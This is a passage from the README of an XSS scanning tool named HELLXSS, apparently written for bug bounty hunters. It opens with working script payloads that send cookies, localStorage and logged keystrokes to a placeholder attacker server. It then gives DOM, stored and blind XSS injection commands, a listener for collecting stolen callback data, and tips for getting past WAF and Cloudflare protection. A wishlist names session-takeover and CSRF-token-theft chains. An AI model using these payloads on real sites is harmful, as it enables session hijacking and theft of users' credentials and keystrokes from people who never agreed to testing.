<script>var x=new XMLHttpRequest();x.open('GET','https://YOUR-SERVER/steal?c='+document.cookie,true);x.send()</script>

# Full data exfil
<script>
var data={cookie:document.cookie,url:location.href,localStorage:JSON.stringify(localStorage)};
fetch('https://YOUR-SERVER/steal?d='+btoa(JSON.stringify(data)));
</script>

# Keylogger
<script>
var log='';
document.addEventListener('keydown',function(e){
  log+=e.key;
  if(log.length>50){fetch('https://YOUR-SERVER/keys?k='+btoa(log));log='';}
});
</script>
```

### DOM XSS Testing

```bash
# Via URL hash
https://target.com/page#<img src=x onerror=alert(1)>

# Via URL search
https://target.com/page?name=<img src=x onerror=alert(1)>

# In browser console — test sinks manually
document.getElementById('output').innerHTML = location.hash.slice(1);
location.hash = '<img src=x onerror=alert(1)>';

# Check for vulnerable patterns in JS
curl -sk "https://target.com/app.js" | grep -E "innerHTML|document\.write|eval\("
```

### Blind XSS Setup

```bash
# Option 1: Simple Python server
python3 -c "
import http.server, socketserver, urllib.parse
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        print(f'[XSS CALLBACK] Path: {self.path}')
        print(f'  Data: {urllib.parse.unquote(self.path)}')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ok')
with socketserver.TCPServer(('',8888),H) as s:
    print('Listening on :8888')
    s.serve_forever()
" &

# Then run HELLXSS with your IP:port
python3 hellxss.py -t https://target.com --blind-url http://YOUR_IP:8888

# Option 2: Use free service
# https://xsshunter.trufflesecurity.com
python3 hellxss.py -t https://target.com --blind-url https://YOUR-ID.xss.ht
```

### Testing Stored XSS

```bash
# Submit payload to form
curl -sk -X POST "https://target.com/comment" \
  --data "name=test&message=<script>alert(1)</script>&email=test@test.com"

# Check if it fired
curl -sk "https://target.com/comments" | grep -i "alert(1)"

# Full stored XSS workflow
curl -sk -c cookies.txt -X POST "https://target.com/register" \
  --data "username=testuser<script>alert(1)</script>&password=Test123!"
curl -sk -b cookies.txt "https://target.com/profile" | grep -i "alert(1)"
```

---

## 🔧 Troubleshooting

### No Module named 'requests'

```bash
pip3 install requests beautifulsoup4 --break-system-packages
# OR
sudo apt install python3-requests python3-bs4
```

### 0 Results on Known Vulnerable Target

```bash
# Try with specific URL and no crawl
python3 hellxss.py -t https://target.com \
  -u "https://target.com/search?q=test" --skip-crawl

# Enable WAF bypass
python3 hellxss.py -t https://target.com --waf-bypass --level 3

# Try with session cookie (might require auth)
python3 hellxss.py -t https://target.com \
  --cookie "PHPSESSID=YOUR_SESSION" --skip-crawl -u "URL_WITH_PARAM"
```

### Scan Too Slow

```bash
# Skip DOM analysis (most time-consuming on large JS)
python3 hellxss.py -t https://target.com --skip-dom

# Skip slow modules
python3 hellxss.py -t https://target.com --skip-modules 4,5,6,10 --level 1

# Use fewer threads on slow target
python3 hellxss.py -t https://target.com --threads 3 --delay 1
```

### Target Behind Cloudflare

```bash
python3 hellxss.py -t https://target.com \
  --waf-bypass --random-agent \
  --delay 2 --threads 3 \
  -p http://127.0.0.1:8080  # observe in Burp
```

### Report Not Found

```bash
find ~/hellxss_output -name "HELLXSS_*.html" 2>/dev/null
# Ctrl+C also saves partial report
```

---

## 🤝 Contributing

```bash
git clone https://github.com/hellrider978/hellxss.git
cd hellxss
git checkout -b feature/self-xss-escalation-module

# Test on legal targets
python3 hellxss.py -t https://testphp.vulnweb.com --ultra

git commit -m "Add: Self-XSS + CSRF escalation module"
git push origin feature/self-xss-escalation-module
```

### Wanted Features

```
[ ] Headless browser verification (Playwright/Puppeteer)
[ ] Self-XSS + CSRF escalation chains
[ ] XSS to CSRF automation (steal CSRF token via XSS → perform action)
[ ] XSS to session takeover pipeline
[ ] GraphQL mutation XSS testing
[ ] Electron app XSS (desktop app testing)
[ ] PDF XSS (jsPDF, pdfkit vectors)
[ ] Email template XSS (newsletter body injection)
[ ] Flash/legacy plugin XSS (SWF injection)
[ ] Subdomain-based XSS (cookie scope testing)
[ ] Mass report export (HackerOne/Bugcrowd format)
```

---

## 👤 Author

<div align="center">

```
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║    ██████╗  █████╗      ██╗███████╗███████╗██╗  ██╗         ║
║    ██╔══██╗██╔══██╗     ██║██╔════╝██╔════╝██║  ██║         ║
║    ██████╔╝███████║     ██║█████╗  ███████╗███████║         ║
║    ██╔══██╗██╔══██║██   ██║██╔══╝  ╚════██║██╔══██║         ║
║    ██║  ██║██║  ██║╚█████╔╝███████╗███████║██║  ██║         ║
║    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚════╝ ╚══════╝╚══════╝╚═╝  ╚═╝         ║
║                     B A J I Y A                               ║
╚═══════════════════════════════════════════════════════════════╝
```

## RAJESH BAJIYA
### 🔥 HACKEROFHELL

**Bug Bounty Hunter · Penetration Tester · Security Researcher**
**"Built by a man from Hell — finds what others miss"**

<br>

[![GitHub](https://img.shields.io/badge/GitHub-hellrider978-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hellrider978)
[![HackerOne](https://img.shields.io/badge/HackerOne-hellrider978-494649?style=for-the-badge&logo=hackerone&logoColor=white)](https://hackerone.com/hellrider978)
[![Bugcrowd](https://img.shields.io/badge/Bugcrowd-hellrider978-F26822?style=for-the-badge&logo=bugcrowd&logoColor=white)](https://bugcrowd.com/hellrider978)

<br>

---

```
"XSS has been the #1 bug class in bug bounty for a decade.
 HELLXSS makes sure you find every single one —
 reflected, stored, DOM, blind, template, upload, and more."

                    — RAJESH BAJIYA | HACKEROFHELL
```

---

### ⭐ If HELLXSS found you bounties — Star it!

[![Star](https://img.shields.io/badge/⭐%20Star%20This%20Repo-hellrider978%2Fhellxss-ffd60a?style=for-the-badge)](https://github.com/hellrider978/hellxss)

**Built with 🔥 by RAJESH BAJIYA (HACKEROFHELL)**
**GitHub: [hellrider978](https://github.com/hellrider978)**

`#xss #bugbounty #pentesting #kalilinux #hackerofhell #rajeshbajiya #hellrider978 #automation #infosec`

</div>

---

## 📜 License

```
MIT License — Copyright (c) 2024 RAJESH BAJIYA (HACKEROFHELL / hellrider978)
GitHub: https://github.com/hellrider978/hellxss

For authorized testing only. Author not liable for misuse.
```

---

<div align="center">

```
🔥 HELLXSS v1.0 ULTRA 🔥
Built by RAJESH BAJIYA — HACKEROFHELL — hellrider978
https://github.com/hellrider978/hellxss
```

</div>
